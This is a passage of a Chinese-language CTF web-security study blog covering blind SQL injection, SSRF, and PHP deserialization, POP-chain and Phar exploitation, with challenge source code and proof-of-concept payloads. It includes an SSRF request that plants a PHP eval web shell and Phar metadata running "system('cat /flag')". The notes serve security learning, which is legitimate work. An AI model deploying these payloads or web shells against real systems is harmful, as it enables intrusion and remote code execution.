mid</span><br><span class="line">     mid = (low+high)//<span class="number">2</span></span><br><span class="line"> <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">     <span class="keyword">break</span></span><br><span class="line"> flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line"> <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>+<span class="built_in">bytes</span>.fromhex(flag).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>



<h3 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="(3)布尔盲注"></a>(3)布尔盲注</h3><h4 id="BUUCTF在线评测-https-buuoj-cn-challenges-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#BUUCTF在线评测-https-buuoj-cn-challenges-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[BUUCTF在线评测](https://buuoj.cn/challenges#[CISCN2019 华北赛区 Day2 Web1]Hack World)"></a>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019">https://buuoj.cn/challenges#[CISCN2019</a> 华北赛区 Day2 Web1]Hack World)</h4><h2 id="XXS"><a href="#XXS" class="headerlink" title="XXS"></a>XXS</h2><h3 id="1-存储型"><a href="#1-存储型" class="headerlink" title="(1)存储型"></a>(1)存储型</h3><h3 id="2-反射型"><a href="#2-反射型" class="headerlink" title="(2)反射型"></a>(2)反射型</h3><h3 id="3-DOM型"><a href="#3-DOM型" class="headerlink" title="(3)DOM型"></a>(3)DOM型</h3><h2 id="XXE和SSRF"><a href="#XXE和SSRF" class="headerlink" title="XXE和SSRF"></a>XXE和SSRF</h2><p>主要是提一下原理和模板</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HITCON">https://buuoj.cn/challenges#[HITCON</a> 2017]SSRFme)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://c9f6fe87-ec4b-42d3-9b16-a372427cc0a0.node5.buuoj.cn:81/?url=data:text/plain,%27%3C?php%20@eval($_POST[%27capt%27])?%3E%27&amp;filename=upload/test.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://c9f6fe87-ec4b-42d3-9b16-a372427cc0a0.node5.buuoj.cn:81/sandbox/50d5f583d8a911dde39156ba3f03c3d5/upload/test.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>蚁剑连接即可</p>
<h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p>主要是..&#x2F;..&#x2F;，但包含php和python的目录穿越</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>主要是Php</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11953">php反序列化完整总结-先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fish-pompom/p/11126473.html">PHP反序列化从初级到高级利用篇 - fish_pompom - 博客园</a></p>
<h3 id="∞-原理"><a href="#∞-原理" class="headerlink" title="(∞)原理"></a>(∞)原理</h3><h3 id="1-一些函数"><a href="#1-一些函数" class="headerlink" title="(1)一些函数"></a>(1)一些函数</h3><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h4><p>1</p>
<h4 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h4><p>2</p>
<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a>__destruct</h4><p>3</p>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><p>4</p>
<h4 id="get-set"><a href="#get-set" class="headerlink" title="get(),set()"></a>get(),set()</h4><p>5</p>
<h4 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h4><p>调用一个不存在的方法时，会触发 <code>__call()</code> 魔法方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你调用了不存在的方法: <span class="subst">$name</span>\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;传递的参数是: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">someNonExistentMethod</span>(<span class="string">&#x27;参数1&#x27;</span>, <span class="string">&#x27;参数2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#你调用了不存在的方法: someNonExistentMethod</span></span><br><span class="line"><span class="comment">#传递的参数是: 参数1, 参数2</span></span><br></pre></td></tr></table></figure>

<p>假设我们有一个类 <code>Example</code>，其中定义了 <code>__call()</code> 方法，没有定义 <code>someNonExistentMethod()</code>，直接调用 <code>someNonExistentMethod()</code> 就会触发 <code>__call()</code></p>
<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h4><ul>
<li>当一个对象被当作函数调用时，<code>__invoke()</code> 方法会被自动调用。这使得对象可以像函数一样被调用，提供了更多的灵活性，可以创建可调用的对象，这样的对象在某些场景下可以作为回调函数等使用。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InvokableClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, <span class="subst">$name</span>!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建对象</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">InvokableClass</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 像调用函数一样调用对象</span></span><br><span class="line"><span class="variable">$obj</span>(<span class="string">&quot;PHP&quot;</span>);  <span class="comment">// 输出 &quot;Hello, PHP!&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><p>在 PHP 中，<code>__toString()</code> 是一个魔术方法，用于定义对象被当作字符串使用时的返回值。当你尝试将一个对象转换为字符串（例如，直接将对象与字符串拼接，或者用 <code>echo</code> 输出对象）时，PHP 会自动调用该对象的 <code>__toString()</code> 方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>; <span class="comment">// 输出: Hello, World!</span></span><br></pre></td></tr></table></figure>





<h3 id="2-php一般反序列化"><a href="#2-php一般反序列化" class="headerlink" title="(2)php一般反序列化"></a>(2)php一般反序列化</h3><h4 id="攻防世界-Web-php-unserialize"><a href="#攻防世界-Web-php-unserialize" class="headerlink" title="攻防世界 Web_php_unserialize"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> <strong>Web_php_unserialize</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-php-Pop链"><a href="#3-php-Pop链" class="headerlink" title="(3)php-Pop链"></a>(3)php-Pop链</h3><h4 id="ISCC2025区域赛-想犯大吴疆土吗"><a href="#ISCC2025区域赛-想犯大吴疆土吗" class="headerlink" title="ISCC2025区域赛 想犯大吴疆土吗"></a>ISCC2025区域赛 想犯大吴疆土吗</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 犯flag.php疆⼟者，盛必击⽽破之！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuDingDao</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$desheng</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;desheng = <span class="keyword">array</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$yishi</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$dingjv</span> = <span class="variable language_">$this</span>-&gt;desheng;</span><br><span class="line">		<span class="variable">$dingjv</span>();</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;下次沙场相⻅, 徐某定不留情&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TieSuoLianHuan</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$yicheng</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$pojun</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="variable">$pojun</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;yicheng);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jie_Xusheng</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sha</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$jiu</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$secret</span> = <span class="string">&#x27;reward.php&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sha = <span class="variable">$secret</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;jiu-&gt;sha;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;sha))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;你休想偷看吴国机密&quot;</span>;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;sha = <span class="string">&quot;reward.php&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;你什么都没看到？那说明……有东西你没看到&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xusheng&#x27;</span>])) &#123;</span><br><span class="line">	@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xusheng&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Jie_Xusheng</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 铸下这铁链，江东天险牢不可破！</span></span><br></pre></td></tr></table></figure>

<p><strong>构造Payload</strong></p>
<ol>
<li>设置 <code>TieSuoLianHuan</code> 的 <code>yicheng</code> 为 <strong>php:&#x2F;&#x2F;filter&#x2F;convert.base64-</strong></li>
</ol>
<p><strong>encode&#x2F;resource&#x3D;flag.php</strong> （需URL编码）</p>
<ol start="2">
<li>将 <code>TieSuoLianHuan</code> 实例赋值给 <code>GuDingDao</code> 的 <code>desheng</code> </li>
<li>将 <code>GuDingDao</code> 实例赋值给 <code>Jie_Xusheng (B)</code> 的 jiu 属性</li>
<li>将 <code>Jie_Xusheng</code> (B) 作为 <code>Jie_Xusheng (A)</code> 的 sha 属性</li>
<li>序列化对象A，确保属性命名和类名正确。</li>
</ol>
<h4 id="LitCTF-2025-君の名は-NSSCTF"><a href="#LitCTF-2025-君の名は-NSSCTF" class="headerlink" title="[LitCTF 2025]君の名は | NSSCTF"></a>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6783">LitCTF 2025]君の名は | NSSCTF</a></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ArrayObject::unserialize</span><br><span class="line">ArrayIterator::unserialize</span><br><span class="line">RecursiveArrayIterator::unserialize</span><br><span class="line">SplObjectStorage::unserialize</span><br></pre></td></tr></table></figure>

<p>POC：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$magic</span> = <span class="string">&quot;invoke&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$thread</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kuchikamizake</span> = <span class="string">&quot;ReflectionFunction&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;\000lambda_1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Taki</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Mitsuha</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">KatawareDoki</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> -&gt; musubi = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; thread = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; soul = <span class="variable">$a</span>; <span class="comment">//调用不存在的$a-&gt;flag($c-&gt;kuchikamizake, $c-&gt;name)，触发call</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">array</span>(<span class="string">&quot;PusTR&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#当 $a-&gt;musubi() 被调用时，实际上是在调用 $b，因为 $a-&gt;musubi 被设置为 $b</span></span><br><span class="line"><span class="comment">#$b 是一个 Mitsuha 类的实例，Mitsuha 类有一个 __invoke() 方法，因此 $b 可以像函数一样被调用</span></span><br><span class="line"><span class="comment">#$b-&gt;__invoke() 返回 $b-&gt;memory.$b-&gt;thread</span></span><br><span class="line"><span class="comment">#$b-&gt;thread 是 $c，因此 $b-&gt;__invoke() 返回 $b-&gt;memory.$c</span></span><br><span class="line"><span class="comment">#$c被当作字符串调用(拼接)，触发__toString()</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#Litctf2025=C%3A11%3A%22ArrayObject%22%3A245%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A5%3A%22PusTR%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3BO%3A7%3A%22Mitsuha%22%3A2%3A%7Bs%3A6%3A%22memory%22%3BN%3Bs%3A6%3A%22thread%22%3BO%3A12%3A%22KatawareDoki%22%3A3%3A%7Bs%3A4%3A%22soul%22%3Br%3A4%3Bs%3A13%3A%22kuchikamizake%22%3Bs%3A18%3A%22ReflectionFunction%22%3Bs%3A4%3A%22name%22%3Bs%3A9%3A%22%00lambda_1%22%3B%7D%7Ds%3A5%3A%22magic%22%3Bs%3A6%3A%22invoke%22%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D</span></span><br></pre></td></tr></table></figure>







<h3 id="4-Phar反序列化"><a href="#4-Phar反序列化" class="headerlink" title="(4)Phar反序列化"></a>(4)Phar反序列化</h3><p>[文件上传与Phar反序列化的摩擦_<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53090346/article/details/127676088">nssround#4 swpu]1zweb(revenge)-CSDN博客</a></p>
<p><code>php -d phar.readonly=0 class5.php</code>(核心出装)</p>
<h4 id="1-ezphar"><a href="#1-ezphar" class="headerlink" title="1.ezphar"></a>1.ezphar</h4><p>1</p>
<h4 id="2-bypass"><a href="#2-bypass" class="headerlink" title="2.bypass"></a>2.bypass</h4><h5 id="NSSRound-4-SWPU-1zweb-NSSCTF"><a href="#NSSRound-4-SWPU-1zweb-NSSCTF" class="headerlink" title="[NSSRound#4 SWPU]1zweb | NSSCTF"></a>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2484">NSSRound#4 SWPU]1zweb | NSSCTF</a></h5><p>POC:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">LoveNss</span>();</span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//自定义的meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算,默认是SHA1</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>修复签名:(修改了类型数量)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read() </span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型和GBMB标识</span></span><br><span class="line">newf = s + sha256(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;newtest.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> 